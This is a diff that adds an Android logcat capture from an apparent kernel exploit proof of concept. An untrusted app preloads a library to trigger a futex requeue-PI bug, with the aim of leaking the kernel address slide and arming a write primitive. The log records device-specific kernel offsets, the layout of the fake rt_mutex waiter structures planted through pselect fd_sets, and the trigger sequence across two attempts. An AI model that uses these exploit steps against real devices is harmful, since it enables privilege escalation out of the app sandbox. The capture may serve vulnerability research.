@@ -1,0 +1,286 @@
+--------- beginning of main
+08-22 05:19:44.706 26817 26817 I DchampApp: uid=10448 pid=26817 nativeLibraryDir=/data/app/~~YVLdezXyqqi2JHA7gC_VlA==/com.dchamp.poc--N13mvZ8yBC9e9ump0w7Kw==/lib/arm64
+08-22 05:19:44.707 26817 26817 I DchampApp: libpreload.so exists=true canRead=true canExecute=true len=4702904
+08-22 05:19:44.707 26817 26817 I DchampApp: mode=execslide
+08-22 05:19:44.710 26817 26817 I DchampApp: child started LD_PRELOAD=/data/app/~~YVLdezXyqqi2JHA7gC_VlA==/com.dchamp.poc--N13mvZ8yBC9e9ump0w7Kw==/lib/arm64/libpreload.so PERF_ONLY=null SLIDE_ONLY=1
+08-22 05:19:44.724 28032 28032 I dchamp  : [+] preload starting pid=28032
+08-22 05:19:44.724 28032 28032 I dchamp  : [+] startup context pid=28032 uid=10448 euid=10448 gid=10448 egid=10448 attr=u:r:untrusted_app_27:s0:c192,c257,c512,c768 enforce=unreadable
+08-22 05:19:44.724 28032 28032 I dchamp  : [+] startup limits pid=28032 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
+08-22 05:19:44.724 28032 28032 I dchamp  : [+] build config pid=28032 label=shennong_OS3.0.307.0.WNBCNXM_16.0 slide=pselect main=pselect
+08-22 05:19:44.724 28032 28032 I dchamp  : [+] p0 profile pid=28032 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff80a9fe29c8 bootid_data=ffffff80aa107448 init_task=ffffff80a9fef600 root_tg=ffffff80aa1d7580 sysctl_bootid=ffffff80aa24a458
+08-22 05:19:44.724 28032 28032 W dchamp  : [-] perf text-base perf_event_open errno=13
+08-22 05:19:44.724 28032 28032 I dchamp  : [*] slide attempt 1 PROBE MODE: sched_setattr disabled, expect clean pselect return + fd_set write-back dump
+08-22 05:19:44.725 26817 28034 I DchampApp: child| [32m[+] [0mpreload starting pid=28032
+08-22 05:19:44.725 26817 28034 I DchampApp: child| [32m[+] [0mstartup context pid=28032 uid=10448 euid=10448 gid=10448 egid=10448 attr=u:r:untrusted_app_27:s0:c192,c257,c512,c768 enforce=unreadable
+08-22 05:19:44.725 26817 28034 I DchampApp: child| [32m[+] [0mstartup limits pid=28032 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
+08-22 05:19:44.725 26817 28034 I DchampApp: child| [32m[+] [0mbuild config pid=28032 label=shennong_OS3.0.307.0.WNBCNXM_16.0 slide=pselect main=pselect
+08-22 05:19:44.725 26817 28034 I DchampApp: child| [32m[+] [0mp0 profile pid=28032 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff80a9fe29c8 bootid_data=ffffff80aa107448 init_task=ffffff80a9fef600 root_tg=ffffff80aa1d7580 sysctl_bootid=ffffff80aa24a458
+08-22 05:19:44.725 26817 28034 I DchampApp: child| [31m[-] [0mperf text-base perf_event_open errno=13
+08-22 05:19:44.725 26817 28034 I DchampApp: child| [33m[*] [0mslide attempt 1 PROBE MODE: sched_setattr disabled, expect clean pselect return + fd_set write-back dump
+08-22 05:20:03.249 28032 28032 I dchamp  : [*] slide attempt 1 uses pselect shift=3 page=ffffff8afc590000 lock=ffffff8afc5904d0 w0=ffffff8afc5913a0 task=ffffff8afc592380
+08-22 05:20:03.249 26817 28034 I DchampApp: child| [33m[*] [0mslide attempt 1 uses pselect shift=3 page=ffffff8afc590000 lock=ffffff8afc5904d0 w0=ffffff8afc5913a0 task=ffffff8afc592380
+08-22 05:20:03.251  1997  1997 I dchamp  : [+] slide child context route=pselect pid=1997 uid=10448 euid=10448 gid=10448 egid=10448 attr=u:r:untrusted_app_27:s0:c192,c257,c512,c768 enforce=unreadable
+08-22 05:20:03.251 26817 28034 I DchampApp: child| [32m[+] [0mslide child context route=pselect pid=1997 uid=10448 euid=10448 gid=10448 egid=10448 attr=u:r:untrusted_app_27:s0:c192,c257,c512,c768 enforce=unreadable
+08-22 05:20:03.252  1997  1997 I dchamp  : [*] slide child creating threads waiter/owner
+08-22 05:20:03.252 26817 28034 I DchampApp: child| [33m[*] [0mslide child creating threads waiter/owner
+08-22 05:20:03.252  1997  1997 I dchamp  : [*] slide child waiting for waiter_waiting && owner_started
+08-22 05:20:03.252 26817 28034 I DchampApp: child| [33m[*] [0mslide child waiting for waiter_waiting && owner_started
+08-22 05:20:03.253  1997  2002 I dchamp  : [*] slide owner started, locking pi_target futex=0x76d11bbfb8
+08-22 05:20:03.253 26817 28034 I DchampApp: child| [33m[*] [0mslide owner started, locking pi_target futex=0x76d11bbfb8
+08-22 05:20:03.253  1997  2002 I dchamp  : [*] slide owner locked pi_target
+08-22 05:20:03.254 26817 28034 I DchampApp: child| [33m[*] [0mslide owner locked pi_target
+08-22 05:20:03.254  1997  2001 I dchamp  : [*] slide waiter tid=2001 locking pi_chain futex=0x76d11bbfa4
+08-22 05:20:03.254  1997  2001 I dchamp  : [*] slide waiter locked pi_chain
+08-22 05:20:03.254 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter tid=2001 locking pi_chain futex=0x76d11bbfa4
+08-22 05:20:03.254 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter locked pi_chain
+08-22 05:20:03.255  1997  2002 I dchamp  : [*] slide owner locking pi_chain (must BLOCK before requeue to arm the EDEADLK cycle)
+08-22 05:20:03.255 26817 28034 I DchampApp: child| [33m[*] [0mslide owner locking pi_chain (must BLOCK before requeue to arm the EDEADLK cycle)
+08-22 05:20:03.256  1997  2001 I dchamp  : [*] slide waiter before FUTEX_WAIT_REQUEUE_PI f_wait=0x76d11bbfb4 pi_target=0x76d11bbfb8
+08-22 05:20:03.256 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter before FUTEX_WAIT_REQUEUE_PI f_wait=0x76d11bbfb4 pi_target=0x76d11bbfb8
+08-22 05:20:03.256  1997  1997 I dchamp  : [*] slide child owner_blocked_on_futex=1 tid=2002
+08-22 05:20:03.257  1997  1997 I dchamp  : [*] slide child conditions met, issuing FUTEX_CMP_REQUEUE_PI
+08-22 05:20:03.257  1997  1997 I dchamp  : [*] slide child FUTEX_CMP_REQUEUE_PI ret=-1 errno=35 (need ret=-1 errno=35: the buggy remove_waiter rollback only runs on EDEADLK)
+08-22 05:20:03.257 26817 28034 I DchampApp: child| [33m[*] [0mslide child owner_blocked_on_futex=1 tid=2002
+08-22 05:20:03.257 26817 28034 I DchampApp: child| [33m[*] [0mslide child conditions met, issuing FUTEX_CMP_REQUEUE_PI
+08-22 05:20:03.257 26817 28034 I DchampApp: child| [33m[*] [0mslide child FUTEX_CMP_REQUEUE_PI ret=-1 errno=35 (need ret=-1 errno=35: the buggy remove_waiter rollback only runs on EDEADLK)
+08-22 05:20:03.307  1997  1997 I dchamp  : [*] slide child sent SIGALRM, waiting route_done
+08-22 05:20:03.307 26817 28034 I DchampApp: child| [33m[*] [0mslide child sent SIGALRM, waiting route_done
+08-22 05:20:03.308 26817 28034 I DchampApp: child| [*] slide SIGALRM handler entered (interrupting pselect)
+08-22 05:20:13.256  1997  2001 I dchamp  : [*] slide waiter after FUTEX_WAIT_REQUEUE_PI ret=-1 errno=110
+08-22 05:20:13.257 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter after FUTEX_WAIT_REQUEUE_PI ret=-1 errno=110
+08-22 05:20:13.257  1997  2001 I dchamp  : [*] slide waiter holding pi_chain across pselect
+08-22 05:20:13.257 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter holding pi_chain across pselect
+08-22 05:20:13.257  1997  2001 I dchamp  : [*] slide waiter before pselect_stack_copy page=ffffff8afc590000 lock=ffffff8afc5904d0 w0=ffffff8afc5913a0 task=ffffff8afc592380
+08-22 05:20:13.257 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter before pselect_stack_copy page=ffffff8afc590000 lock=ffffff8afc5904d0 w0=ffffff8afc5913a0 task=ffffff8afc592380
+08-22 05:20:13.257 26817 28034 I DchampApp: child| [33m[*] [0mslide word map tree_pc w0 -> in[3] (global 3) = ffffff8afc5935c1
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map tree_pc w0 -> in[3] (global 3) = ffffff8afc5935c1
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map tree_right w1 -> in[4] (global 4) = 0000000000000000
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map tree_left w2 -> out[0] (global 5) = 0000000000000000
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map pi_parent w3 -> out[1] (global 6) = ffffff8afc5946d1
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map pi_right w4 -> out[2] (global 7) = 0000000000000000
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map pi_left w5 -> out[3] (global 8) = 0000000000000000
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map task w6 -> out[4] (global 9) = ffffff8afc592380
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map lock w7 -> ex[0] (global 10) = ffffff8afc5904d0
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map wake_state_prio w8 -> ex[1] (global 11) = 0000008200000003
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map deadline w9 -> ex[2] (global 12) = 0000000000000000
+08-22 05:20:13.258  1997  2001 I dchamp  : [*] slide word map ww_ctx w10 -> ex[3] (global 13) = 0000000000000000
+08-22 05:20:13.259  1997  2001 I dchamp  : [*] slide dump pre-pselect in[3] (global 3) = ffffff8afc5935c1
+08-22 05:20:13.259  1997  2001 I dchamp  : [*] slide dump pre-pselect out[1] (global 6) = ffffff8afc5946d1
+08-22 05:20:13.259  1997  2001 I dchamp  : [*] slide dump pre-pselect out[4] (global 9) = ffffff8afc592380
+08-22 05:20:13.259  1997  2001 I dchamp  : [*] slide dump pre-pselect ex[0] (global 10) = ffffff8afc5904d0
+08-22 05:20:13.259  1997  2001 I dchamp  : [*] slide dump pre-pselect ex[1] (global 11) = 0000008200000003
+08-22 05:20:13.259  1997  2001 I dchamp  : [*] slide dump pre-pselect ex[4] (global 14) = 8000000000000000
+08-22 05:20:13.259  1997  2001 I dchamp  : [*] slide pselect setup shift=3 nfds=320 page=ffffff8afc590000 fake_lock=ffffff8afc5904d0 fake_w0=ffffff8afc5913a0 fake_task=ffffff8afc592380
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map tree_right w1 -> in[4] (global 4) = 0000000000000000
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map tree_left w2 -> out[0] (global 5) = 0000000000000000
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map pi_parent w3 -> out[1] (global 6) = ffffff8afc5946d1
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map pi_right w4 -> out[2] (global 7) = 0000000000000000
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map pi_left w5 -> out[3] (global 8) = 0000000000000000
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map task w6 -> out[4] (global 9) = ffffff8afc592380
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map lock w7 -> ex[0] (global 10) = ffffff8afc5904d0
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map wake_state_prio w8 -> ex[1] (global 11) = 0000008200000003
+08-22 05:20:13.259  1997  2001 I dchamp  : [*] slide pselect ENTERING syscall shift=3 timeout_sec=5 block_fd=6
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map deadline w9 -> ex[2] (global 12) = 0000000000000000
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide word map ww_ctx w10 -> ex[3] (global 13) = 0000000000000000
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect in[3] (global 3) = ffffff8afc5935c1
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect out[1] (global 6) = ffffff8afc5946d1
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect out[4] (global 9) = ffffff8afc592380
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect ex[0] (global 10) = ffffff8afc5904d0
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect ex[1] (global 11) = 0000008200000003
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect ex[4] (global 14) = 8000000000000000
+08-22 05:20:13.259 26817 28034 I DchampApp: child| [33m[*] [0mslide pselect setup shift=3 nfds=320 page=ffffff8afc590000 fake_lock=ffffff8afc5904d0 fake_w0=ffffff8afc5913a0 fake_task=ffffff8afc592380
+08-22 05:20:13.260 26817 28034 I DchampApp: child| [33m[*] [0mslide pselect ENTERING syscall shift=3 timeout_sec=5 block_fd=6
+08-22 05:20:13.261  1997  2099 I dchamp  : [*] slide consumer PROBE round call#1 tid=2001: skipping sched_setattr (safe probe; pselect must return without PI chain walk)
+08-22 05:20:13.261 26817 28034 I DchampApp: child| [33m[*] [0mslide consumer PROBE round call#1 tid=2001: skipping sched_setattr (safe probe; pselect must return without PI chain walk)
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide pselect RETURNED ret=0 errno=0 shift=3 probe=1 sched_ok=0 calls=1
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide pselect comparing fd_sets vs planted payload (diffs = kernel wrote back into the waiter stack region)
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide fdset DIFF in[3] pre=ffffff8afc5935c1 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide fdset DIFF out[1] pre=ffffff8afc5946d1 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide pselect RETURNED ret=0 errno=0 shift=3 probe=1 sched_ok=0 calls=1
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide fdset DIFF out[4] pre=ffffff8afc592380 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide fdset DIFF ex[0] pre=ffffff8afc5904d0 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide fdset DIFF ex[1] pre=0000008200000003 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide fdset DIFF ex[4] pre=8000000000000000 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide fdset diff total=6 fdset_stext=0000000000000000
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide pselect comparing fd_sets vs planted payload (diffs = kernel wrote back into the waiter stack region)
+08-22 05:20:18.282  1997  2001 I dchamp  : [*] slide waiter pselect_stack_copy done
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF in[3] pre=ffffff8afc5935c1 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF out[1] pre=ffffff8afc5946d1 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF out[4] pre=ffffff8afc592380 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF ex[0] pre=ffffff8afc5904d0 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF ex[1] pre=0000008200000003 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF ex[4] pre=8000000000000000 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:18.282 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset diff total=6 fdset_stext=0000000000000000
+08-22 05:20:18.283 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter pselect_stack_copy done
+08-22 05:20:18.311  1997  1997 I dchamp  : [*] slide child route_done, reading boot_id
+08-22 05:20:18.311 26817 28034 I DchampApp: child| [33m[*] [0mslide child route_done, reading boot_id
+08-22 05:20:18.312  1997  1997 W dchamp  : [-] slide leaked value is not a kernel pointer (likely untouched boot_id): 024bfbe4d20546a0
+08-22 05:20:18.312  1997  1997 I dchamp  : [*] slide child parked pid=1997 (exit_group PI cleanup avoided)
+08-22 05:20:18.312 26817 28034 I DchampApp: child| [31m[-] [0mslide leaked value is not a kernel pointer (likely untouched boot_id): 024bfbe4d20546a0
+08-22 05:20:18.312 28032 28032 W dchamp  : [-] slide attempt 1 failed n=8 stext=0000000000000000 shift=3
+08-22 05:20:18.312 26817 28034 I DchampApp: child| [33m[*] [0mslide child parked pid=1997 (exit_group PI cleanup avoided)
+08-22 05:20:18.312 26817 28034 I DchampApp: child| [31m[-] [0mslide attempt 1 failed n=8 stext=0000000000000000 shift=3
+08-22 05:20:42.461 28032 28032 I dchamp  : [*] slide attempt 2 uses pselect shift=3 page=ffffff8b025f0000 lock=ffffff8b025f04d0 w0=ffffff8b025f13a0 task=ffffff8b025f2380
+08-22 05:20:42.461 26817 28034 I DchampApp: child| [33m[*] [0mslide attempt 2 uses pselect shift=3 page=ffffff8b025f0000 lock=ffffff8b025f04d0 w0=ffffff8b025f13a0 task=ffffff8b025f2380
+08-22 05:20:42.462 26817 28034 I DchampApp: child| [32m[+] [0mslide child context route=pselect pid=13083 uid=10448 euid=10448 gid=10448 egid=10448 attr=u:r:untrusted_app_27:s0:c192,c257,c512,c768 enforce=unreadable
+08-22 05:20:42.462 13083 13083 I dchamp  : [+] slide child context route=pselect pid=13083 uid=10448 euid=10448 gid=10448 egid=10448 attr=u:r:untrusted_app_27:s0:c192,c257,c512,c768 enforce=unreadable
+08-22 05:20:42.462 13083 13083 I dchamp  : [*] slide child creating threads waiter/owner
+08-22 05:20:42.462 26817 28034 I DchampApp: child| [33m[*] [0mslide child creating threads waiter/owner
+08-22 05:20:42.463 13083 13083 I dchamp  : [*] slide child waiting for waiter_waiting && owner_started
+08-22 05:20:42.463 26817 28034 I DchampApp: child| [33m[*] [0mslide child waiting for waiter_waiting && owner_started
+08-22 05:20:42.464 13083 13085 I dchamp  : [*] slide owner started, locking pi_target futex=0x76d11bbfb8
+08-22 05:20:42.464 26817 28034 I DchampApp: child| [33m[*] [0mslide owner started, locking pi_target futex=0x76d11bbfb8
+08-22 05:20:42.464 13083 13085 I dchamp  : [*] slide owner locked pi_target
+08-22 05:20:42.464 26817 28034 I DchampApp: child| [33m[*] [0mslide owner locked pi_target
+08-22 05:20:42.464 13083 13084 I dchamp  : [*] slide waiter tid=13084 locking pi_chain futex=0x76d11bbfa4
+08-22 05:20:42.464 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter tid=13084 locking pi_chain futex=0x76d11bbfa4
+08-22 05:20:42.464 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter locked pi_chain
+08-22 05:20:42.464 13083 13084 I dchamp  : [*] slide waiter locked pi_chain
+08-22 05:20:42.465 13083 13085 I dchamp  : [*] slide owner locking pi_chain (must BLOCK before requeue to arm the EDEADLK cycle)
+08-22 05:20:42.465 26817 28034 I DchampApp: child| [33m[*] [0mslide owner locking pi_chain (must BLOCK before requeue to arm the EDEADLK cycle)
+08-22 05:20:42.465 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter before FUTEX_WAIT_REQUEUE_PI f_wait=0x76d11bbfb4 pi_target=0x76d11bbfb8
+08-22 05:20:42.465 13083 13083 I dchamp  : [*] slide child owner_blocked_on_futex=1 tid=13085
+08-22 05:20:42.465 26817 28034 I DchampApp: child| [33m[*] [0mslide child owner_blocked_on_futex=1 tid=13085
+08-22 05:20:42.465 13083 13083 I dchamp  : [*] slide child conditions met, issuing FUTEX_CMP_REQUEUE_PI
+08-22 05:20:42.465 26817 28034 I DchampApp: child| [33m[*] [0mslide child conditions met, issuing FUTEX_CMP_REQUEUE_PI
+08-22 05:20:42.466 13083 13083 I dchamp  : [*] slide child FUTEX_CMP_REQUEUE_PI ret=0 errno=0 (need ret=-1 errno=35: the buggy remove_waiter rollback only runs on EDEADLK)
+08-22 05:20:42.466 26817 28034 I DchampApp: child| [33m[*] [0mslide child FUTEX_CMP_REQUEUE_PI ret=0 errno=0 (need ret=-1 errno=35: the buggy remove_waiter rollback only runs on EDEADLK)
+08-22 05:20:42.466 13083 13083 W dchamp  : [-] slide requeue returned success (no EDEADLK): PI cycle was not armed, write primitive will NOT fire this attempt
+08-22 05:20:42.466 26817 28034 I DchampApp: child| [31m[-] [0mslide requeue returned success (no EDEADLK): PI cycle was not armed, write primitive will NOT fire this attempt
+08-22 05:20:42.465 13083 13084 I dchamp  : [*] slide waiter before FUTEX_WAIT_REQUEUE_PI f_wait=0x76d11bbfb4 pi_target=0x76d11bbfb8
+08-22 05:20:42.516 13083 13083 I dchamp  : [*] slide child sent SIGALRM, waiting route_done
+08-22 05:20:42.516 26817 28034 I DchampApp: child| [33m[*] [0mslide child sent SIGALRM, waiting route_done
+08-22 05:20:42.516 26817 28034 I DchampApp: child| [*] slide SIGALRM handler entered (interrupting pselect)
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide waiter after FUTEX_WAIT_REQUEUE_PI ret=-1 errno=110
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide waiter holding pi_chain across pselect
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide waiter before pselect_stack_copy page=ffffff8b025f0000 lock=ffffff8b025f04d0 w0=ffffff8b025f13a0 task=ffffff8b025f2380
+08-22 05:20:52.466 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter after FUTEX_WAIT_REQUEUE_PI ret=-1 errno=110
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map tree_pc w0 -> in[3] (global 3) = ffffff8b025f35c1
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map tree_right w1 -> in[4] (global 4) = 0000000000000000
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map tree_left w2 -> out[0] (global 5) = 0000000000000000
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map pi_parent w3 -> out[1] (global 6) = ffffff8b025f46d1
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map pi_right w4 -> out[2] (global 7) = 0000000000000000
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map pi_left w5 -> out[3] (global 8) = 0000000000000000
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map task w6 -> out[4] (global 9) = ffffff8b025f2380
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map lock w7 -> ex[0] (global 10) = ffffff8b025f04d0
+08-22 05:20:52.466 13083 13084 I dchamp  : [*] slide word map wake_state_prio w8 -> ex[1] (global 11) = 0000008200000003
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide word map deadline w9 -> ex[2] (global 12) = 0000000000000000
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide word map ww_ctx w10 -> ex[3] (global 13) = 0000000000000000
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter holding pi_chain across pselect
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter before pselect_stack_copy page=ffffff8b025f0000 lock=ffffff8b025f04d0 w0=ffffff8b025f13a0 task=ffffff8b025f2380
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide dump pre-pselect in[3] (global 3) = ffffff8b025f35c1
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map tree_pc w0 -> in[3] (global 3) = ffffff8b025f35c1
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide dump pre-pselect out[1] (global 6) = ffffff8b025f46d1
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide dump pre-pselect out[4] (global 9) = ffffff8b025f2380
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map tree_right w1 -> in[4] (global 4) = 0000000000000000
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide dump pre-pselect ex[0] (global 10) = ffffff8b025f04d0
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide dump pre-pselect ex[1] (global 11) = 0000008200000003
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map tree_left w2 -> out[0] (global 5) = 0000000000000000
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide dump pre-pselect ex[4] (global 14) = 8000000000000000
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide pselect setup shift=3 nfds=320 page=ffffff8b025f0000 fake_lock=ffffff8b025f04d0 fake_w0=ffffff8b025f13a0 fake_task=ffffff8b025f2380
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map pi_parent w3 -> out[1] (global 6) = ffffff8b025f46d1
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map pi_right w4 -> out[2] (global 7) = 0000000000000000
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map pi_left w5 -> out[3] (global 8) = 0000000000000000
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map task w6 -> out[4] (global 9) = ffffff8b025f2380
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map lock w7 -> ex[0] (global 10) = ffffff8b025f04d0
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map wake_state_prio w8 -> ex[1] (global 11) = 0000008200000003
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map deadline w9 -> ex[2] (global 12) = 0000000000000000
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide word map ww_ctx w10 -> ex[3] (global 13) = 0000000000000000
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect in[3] (global 3) = ffffff8b025f35c1
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect out[1] (global 6) = ffffff8b025f46d1
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect out[4] (global 9) = ffffff8b025f2380
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect ex[0] (global 10) = ffffff8b025f04d0
+08-22 05:20:52.467 13083 13084 I dchamp  : [*] slide pselect ENTERING syscall shift=3 timeout_sec=5 block_fd=6
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect ex[1] (global 11) = 0000008200000003
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide dump pre-pselect ex[4] (global 14) = 8000000000000000
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide pselect setup shift=3 nfds=320 page=ffffff8b025f0000 fake_lock=ffffff8b025f04d0 fake_w0=ffffff8b025f13a0 fake_task=ffffff8b025f2380
+08-22 05:20:52.467 26817 28034 I DchampApp: child| [33m[*] [0mslide pselect ENTERING syscall shift=3 timeout_sec=5 block_fd=6
+08-22 05:20:52.469 26817 28034 I DchampApp: child| [33m[*] [0mslide consumer call#1 tid=13084 stage=RT-ENTER sched_setattr SCHED_FIFO prio=50
+08-22 05:20:52.469 13083 13950 I dchamp  : [*] slide consumer call#1 tid=13084 stage=RT-ENTER sched_setattr SCHED_FIFO prio=50
+08-22 05:20:52.469 13083 13950 I dchamp  : [*] slide consumer call#1 stage=RT-DONE ret=-1 errno=1 (EPERM=1 means no PI walk on this call)
+08-22 05:20:52.469 13083 13950 I dchamp  : [*] slide consumer call#1 stage=NICE-ENTER sched_setattr nice=19 (this DOES trigger rt_mutex_setprio -> adjust_prio_chain)
+08-22 05:20:52.469 13083 13950 I dchamp  : [*] slide consumer call#1 stage=NICE-DONE ret=0 errno=0
+08-22 05:20:52.469 13083 13950 I dchamp  : [*] slide consumer sched tid=13084 ret=0 errno=0 sched_ok=1
+08-22 05:20:52.469 26817 28034 I DchampApp: child| [33m[*] [0mslide consumer call#1 stage=RT-DONE ret=-1 errno=1 (EPERM=1 means no PI walk on this call)
+08-22 05:20:52.469 26817 28034 I DchampApp: child| [33m[*] [0mslide consumer call#1 stage=NICE-ENTER sched_setattr nice=19 (this DOES trigger rt_mutex_setprio -> adjust_prio_chain)
+08-22 05:20:52.469 26817 28034 I DchampApp: child| [33m[*] [0mslide consumer call#1 stage=NICE-DONE ret=0 errno=0
+08-22 05:20:52.469 26817 28034 I DchampApp: child| [33m[*] [0mslide consumer sched tid=13084 ret=0 errno=0 sched_ok=1
+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide pselect RETURNED ret=0 errno=0 shift=3 probe=0 sched_ok=1 calls=1
+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide pselect comparing fd_sets vs planted payload (diffs = kernel wrote back into the waiter stack region)
+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide fdset DIFF in[3] pre=ffffff8b025f35c1 post=0000000000000000 (内核在鬼标签区写回的内容)
